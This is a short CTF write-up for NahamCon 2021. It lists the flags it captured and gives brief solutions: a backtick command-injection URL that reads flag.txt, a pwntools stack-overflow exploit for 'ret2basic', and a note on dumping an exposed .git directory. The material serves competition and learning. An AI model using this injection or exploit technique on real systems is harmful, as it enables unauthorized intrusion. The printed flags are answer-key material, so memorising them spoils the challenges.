# NahamCon CTF

#### Rules Source code
```flag{90bc54705794a62015369fd8e86e557b}```

### Nahamcon2021
```flag{e36bc5a67dd2fe5f33b62123f78fbcef}```

### Echo
http://challenge.nahamcon.com:30192/?echo=`%3C../flag.txt`

```flag{1beadaf44586ea4aba2ea9a00c5b6d91}```

### Homeward Bound

![image](https://user-images.githubusercontent.com/1076452/111000058-25d8db00-8360-11eb-9b99-3a045d6fd1f2.png)

![image](https://user-images.githubusercontent.com/1076452/111000087-30937000-8360-11eb-998c-07f49f530a66.png)

```flag{26080a2216e95746ec3e932002b9baa4}```

### Ret2basic

```
#!/usr/bin/python
from pwn import *
gs = '''
continue
'''
elf = context.binary = ELF('./ret2basic')
context.terminal = ['tmux', 'splitw', '-hp', '70']

def start():
    if args.GDB:
        return gdb.debug('./ret2basic', gdbscript=gs)
    if args.REMOTE:
        return remote('challenge.nahamcon.com', 30413)
    else:
        return process('./ret2basic')
r = start()
#========= exploit here ===================
win = 0x401215
#ret = 0x40133b
payload = "A" * 120
#payload += p64(ret)
payload += p64(win)
r.sendlineafter(": ",payload)

#========= interactive ====================
r.interactive()
```

![image](https://user-images.githubusercontent.com/1076452/111002592-810ccc80-8364-11eb-9f58-0ca4bb807ed0.png)

### esab64

cat esab64 | rev | base64 -d | rev

```flag{fb5211b498afe87b1bd0db601117e16e}```

### Resourceful

![image](https://user-images.githubusercontent.com/1076452/111007125-e1077100-836c-11eb-9a10-edb11904272d.png)

![image](https://user-images.githubusercontent.com/1076452/111007090-cf25ce00-836c-11eb-989e-3e9f1d579b6c.png)

![image](https://user-images.githubusercontent.com/1076452/111007110-da78f980-836c-11eb-9510-ce5ad11a8954.png)

```flag{7eecc051f5cb3a40cd6bda40de6eeb32}```

### Chicken wings 

https://lingojam.com/WingDing

```flag{e0791ce68f718188c0378b1c0a3bdc9e}```

### Andra

![image](https://user-images.githubusercontent.com/1076452/111007452-a9e58f80-836d-11eb-8fcb-2b86f03bf057.png)

![image](https://user-images.githubusercontent.com/1076452/111007468-b2d66100-836d-11eb-91b5-ac0fed2e04a5.png)

![image](https://user-images.githubusercontent.com/1076452/111007499-b833ab80-836d-11eb-892e-e2854621be02.png)

```flag{d9f72316dbe7ceab0db10bed1a738482}```

### Merch Store

Source code merch store

```flag{fafc10617631126361c693a2a3fce5a7} ```

## Mission

### Bionic

![image](https://user-images.githubusercontent.com/1076452/111012004-27170180-837a-11eb-8aa6-8f0434726b1b.png)

### Meet The Team

https://github.com/internetwache/GitTools

https://constellations.page/.git/

git show

![image](https://user-images.githubusercontent.com/1076452/111013989-719b7c80-8380-11eb-9d8b-719daeb8cbe1.png)


### Gus

![image](https://user-images.githubusercontent.com/1076452/111011972-ffc03480-8379-11eb-8996-25197d69882c.png)


### Hercules

![image](https://user-images.githubusercontent.com/1076452/111013207-5da24b80-837d-11eb-94b6-fa2ce6b44d39.png)

### Lyra

![image](https://user-images.githubusercontent.com/1076452/111014284-c986b300-8381-11eb-86a2-847f0693ee78.png)

![image](https://user-images.githubusercontent.com/1076452/111014303-de634680-8381-11eb-85ee-3b94b44dac07.png)

![image](https://user-images.githubusercontent.com/1076452/111014312-ea4f0880-8381-11eb-9bfb-d8e0a0ae7060.png)

### Orion

https://twitter.com/OrionMorra/status/1363789936219082756

![image](https://user-images.githubusercontent.com/1076452/111014551-ea9bd380-8382-11eb-9418-a6b223bd1c13.png)






